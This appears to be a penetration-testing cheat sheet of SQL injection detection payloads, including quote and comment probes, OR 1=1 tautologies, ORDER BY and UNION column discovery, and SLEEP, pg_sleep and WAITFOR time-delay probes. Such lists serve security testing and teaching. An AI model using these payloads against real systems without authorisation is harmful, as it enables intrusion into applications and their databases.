# SQL Injection Payloads

This file contains commonly used SQL injection payloads organized by purpose and database type.

### Detection Payloads

Basic payloads used to identify whether an input is vulnerable to SQL injection.

Quote Testing

```
'
"
`
')
"))
```

Comment Testing

```
'--
'#
'/*
```

Boolean Testing

```
' OR 1=1--
' OR 1=2--
' OR '1'='1'
' OR '1'='1
' OR '1'='2

' AND 1=1--
' AND 1=2--
' AND '1'='1'
' AND '1'='1
' AND '1'='2
```

ORDER BY Column Discovery

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

UNION Column Discovery

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Time Delay Testing

```
# MySQL
' OR SLEEP(5)--

# PostgreSQL
' OR pg_sleep(5)--

# MSSQL
' WAITFOR DELAY '0:0:5'--
```
